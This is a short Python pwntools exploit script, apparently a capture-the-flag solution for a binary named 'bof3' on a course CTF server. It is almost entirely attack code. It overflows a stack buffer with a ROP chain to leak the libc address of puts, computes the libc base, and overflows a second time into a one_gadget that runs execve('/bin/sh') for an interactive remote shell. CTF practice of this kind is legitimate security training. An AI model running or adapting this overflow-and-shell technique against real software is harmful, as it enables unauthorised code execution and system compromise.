#!/usr/bin/env python2
from pwn import *

file1, file2 = "./bof3", "./libc.so.6"
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10127

r, context.binary = remote(server, port), file1
# ========================================================================
binary, libc = ELF(file1), ELF(file2)

pop_rdi = 0x400673 # pop rdi; ret find with ROPgadget

# ROPchain: pop rdi -> puts -> main
ROPchain = [ pop_rdi, binary.got['puts'], binary.plt['puts'], binary.symbols['main'] ]
r.sendline( 'a'*16 + flat( ROPchain ) )
r.recvuntil('\n')

leak_puts = u64( r.recvuntil('\n').strip().ljust(8, '\x00') )
libc_base = leak_puts - libc.symbols['puts']

# 0x4f2c5 find with one_gadget in libc.so.6 to execve("/bin/sh", rsp+0x40, environ)
gadget = libc_base + 0x4f2c5


r.sendline( 'a'*16 + p64(gadget) )

r.interactive()
